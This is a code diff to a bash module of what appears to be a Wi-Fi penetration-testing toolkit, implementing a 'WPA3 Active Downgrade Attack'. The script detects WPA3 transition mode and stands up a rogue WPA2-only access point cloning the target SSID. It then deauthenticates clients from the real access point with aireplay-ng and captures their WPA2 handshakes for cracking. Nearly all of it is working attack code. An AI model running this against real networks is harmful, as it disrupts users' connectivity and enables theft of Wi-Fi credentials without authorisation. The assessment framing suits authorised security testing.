@@ -34,8 +34,33 @@
 set -uo pipefail
 
 run_d7() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=6
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d7"
+    local evidence_prefix="${evidence_dir}/d7"
     local findings_file="${evidence_prefix}_findings.txt"
     local hostapd_conf="${evidence_prefix}_hostapd.conf"
     local hostapd_log="${evidence_prefix}_hostapd.log"
@@ -47,15 +72,18 @@ run_d7() {
 
     check_module_dependencies "D7" || return 1
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
         log_warn "Target SSID/BSSID not set."
         if ! select_target_network; then
             log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-}"
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"
+    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"
 
     local transition_mode="false"
     local handshake_found="false"
@@ -63,23 +91,24 @@ run_d7() {
     {
         echo "============================================================"
         echo "  D7: WPA3 Active Downgrade Attack"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${ssid} (${bssid})"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
         echo "============================================================"
     } > "$findings_file"
 
     # Verify Transition Mode
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
     local beacon_file="$TMP_DIR/d7_beacon.pcap"
     rm -f "$beacon_file"
     
     log_info "Verifying Transition Mode AKMs..."
-    run_fg "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -c 10 -w "$beacon_file" "type mgt subtype beacon and ether src ${GUEST_BSSID}" 2>/dev/null || true
+    run_fg tcpdump -i "$mon_iface" -c 10 -w "$beacon_file" "type mgt subtype beacon and ether src ${bssid}" 2>/dev/null || true
     
+    local akms=""
     if [[ -f "$beacon_file" && -s "$beacon_file" ]]; then
-        local akms
-        akms=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_file" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || echo "")
+        akms=$(run_fg tshark -r "$beacon_file" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || echo "")
         # Type 2=PSK, 8=SAE. If both present, it's transition mode.
         if [[ "$akms" == *"2"* ]] && [[ "$akms" == *"8"* ]]; then
             transition_mode="true"
@@ -94,7 +123,7 @@ run_d7() {
         echo "Status: Skipped - Target not in Transition Mode" >> "$findings_file"
         
         local result_json
-        result_json=$(run_fg "jq" -n \
+        result_json=$(run_fg jq -n \
             --arg status "INFO" \
             --arg summary "Active downgrade not applicable (not WPA3 Transition Mode)." \
             --arg details "Target AKMs: ${akms:-none}" \
@@ -109,17 +138,17 @@ run_d7() {
     log_step 2 $total_steps "Preparing Rogue WPA2 AP"
     update_tc_progress 2 $total_steps "AP Setup"
 
-    local ap_iface="${WIFI_INTERFACE:-wlan0}"
+    local ap_iface="${interface}"
     
     # Warning: Using the same interface for Rogue AP and Monitor mode might fail on some hardware
-    log_info "Deploying Rogue AP on ${ap_iface}: ${GUEST_SSID} (WPA2-PSK Only)"
+    log_info "Deploying Rogue AP on ${ap_iface}: ${ssid} (WPA2-PSK Only)"
     
     cat <<EOF > "$hostapd_conf"
 interface=${ap_iface}
 driver=nl80211
-ssid=${GUEST_SSID}
+ssid=${ssid}
 hw_mode=g
-channel=6
+channel=${channel:-6}
 auth_algs=1
 wpa=2
 wpa_key_mgmt=WPA-PSK
@@ -134,12 +163,12 @@ EOF
     update_tc_progress 3 $total_steps "Execution"
 
     # Start Rogue AP in background
-    spawn_bg "rogue_ap" "${TOOL_PATHS[hostapd]}" "$hostapd_conf"
+    spawn_bg "d7_rogue_ap" "hostapd" "$hostapd_conf"
     sleep 5
 
     # Start Handshake Capture
     rm -f "${handshake_cap_prefix}"* 2>/dev/null
-    spawn_bg "handshake_cap" "${TOOL_PATHS[airodump-ng]}" --essid "$GUEST_SSID" --channel 6 --write "$handshake_cap_prefix" "$mon_iface"
+    spawn_bg "d7_handshake_cap" "airodump-ng" --essid "$ssid" --channel "${channel:-6}" --write "$handshake_cap_prefix" "$mon_iface"
 
     check_abort || return 1
 
@@ -147,16 +176,16 @@ EOF
     log_step 4 $total_steps "Forcing Downgrade (Deauth Legitimate AP)"
     update_tc_progress 4 $total_steps "Deauthentication"
 
-    log_info "Deauthenticating clients from legitimate AP (${GUEST_BSSID})..."
-    run_fg "${TOOL_PATHS[aireplay-ng]}" --deauth 20 -a "$GUEST_BSSID" "$mon_iface"
+    log_info "Deauthenticating clients from legitimate AP (${bssid})..."
+    run_fg aireplay-ng --deauth 20 -a "$bssid" "$mon_iface"
 
     start_countdown 60 "Waiting for clients to fall back to Rogue WPA2 AP"
     sleep 60
     stop_countdown
 
     # Stop background processes
-    stop_process "handshake_cap"
-    stop_process "rogue_ap"
+    stop_process "d7_handshake_cap"
+    stop_process "d7_rogue_ap"
 
     check_abort || return 1
 
@@ -167,7 +196,7 @@ EOF
     local cap_file
     cap_file=$(ls "${handshake_cap_prefix}"*.cap 2>/dev/null | head -1)
     if [[ -n "$cap_file" && -f "$cap_file" ]]; then
-        if run_fg "${TOOL_PATHS[aircrack-ng]}" "$cap_file" 2>/dev/null | grep -q "1 handshake"; then
+        if run_fg aircrack-ng "$cap_file" 2>/dev/null | grep -q "1 handshake"; then
             handshake_found="true"
             log_result "CRITICAL" "WPA3 DOWNGRADE SUCCESSFUL: Captured WPA2 handshake from WPA3-capable client!"
             echo "RESULT: WPA3 Downgrade SUCCESSFUL - WPA2 handshake captured" >> "$findings_file"
@@ -199,13 +228,13 @@ EOF
 
     evidence_register_file "$hostapd_conf"
     evidence_register_file "$findings_file"
-    [[ -f "$cap_file" ]] && evidence_register_file "$cap_file"
+    [[ -n "$cap_file" && -f "$cap_file" ]] && evidence_register_file "$cap_file"
 
     local result_json
-    result_json=$(run_fg "jq" -n \
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
-        --arg details "Target SSID: ${GUEST_SSID}, Transition Mode: ${transition_mode}, Handshake Captured: ${handshake_found}" \
+        --arg details "Target SSID: ${ssid}, Transition Mode: ${transition_mode}, Handshake Captured: ${handshake_found}" \
         --arg recommendations "$recommendations" \
         '{
             status: $status,
